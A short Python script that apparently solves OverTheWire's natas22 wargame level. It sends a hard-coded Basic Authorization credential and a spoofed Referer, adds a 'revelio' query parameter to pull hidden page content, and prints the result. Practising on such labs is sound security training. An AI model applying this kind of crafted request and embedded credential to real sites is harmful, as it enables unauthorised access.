import requests
from bs4 import BeautifulSoup

headers = {"Authorization": "Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==", "Referer": "http://natas22.natas.labs.overthewire.org/"}
params = [('revelio', '')]
result = requests.get("http://natas22.natas.labs.overthewire.org", headers=headers, params=params)
print(result.content)
